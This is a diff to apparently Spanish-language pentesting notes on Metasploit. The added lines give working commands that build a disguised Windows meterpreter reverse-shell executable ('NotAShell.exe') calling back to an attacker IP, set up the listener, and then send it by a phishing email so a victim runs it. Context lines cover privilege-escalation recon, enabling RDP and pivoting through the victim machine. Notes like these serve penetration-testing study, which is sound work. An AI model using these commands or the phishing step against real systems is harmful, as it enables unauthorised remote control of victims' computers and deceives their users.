@@ -480,6 +480,18 @@ $ script -qc /bin/bash /dev/null
 		- **`run post/multi/recon/local_exploit_suggester`:** Para ver que podemos usar para subir privilegios
 		- **`run post/windows/manage/enable_rdp`:** Para abrir el control de escritorio remoto
 		- **`run autoroute -h`:** Permite usar como gateway la máquina victima para acceder a otras partes de la red
+	- Veamos como crear una reverve shell con un payload staged (Necesitará un handler especifico pero será más pequeño) utilizando phishing a un sistema Windows:
+		1. Usamos `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATACKER_IP> LPORT=53 -f exe -o NotAShell.exe` para crear el ejecutable que mandaremos
+		2. Deberemos ahora lanzar Metasploit y esperar a que alguien ejecute el archivo creado antes:
+		```
+		msfconsole
+		use exploit/multi/handler
+		set payload windows/meterpreter/reverse_tcp
+		set LPORT 53
+		set LHOST <La misma dirección usada con msfvenom>
+		exploit -j
+		```
+		3. Ahora toca la parte en la que mandas el correo intentando convencer al usuario de ejecutar tu archivo
 	- En caso de querer utilizar alguna herramienta externa a metasploit podemos hacer lo siguiente:
 		1. Abrir un proxy socks4a desde metasploit para utilizar la route que hemos metido antes
 		2. Una vez con eso hecho, vamos al fichero `/etc/proxychains.conf` y añadimos una linea de que proxy usar (Ejemplo: `socks4 127.0.0.1 8080`)
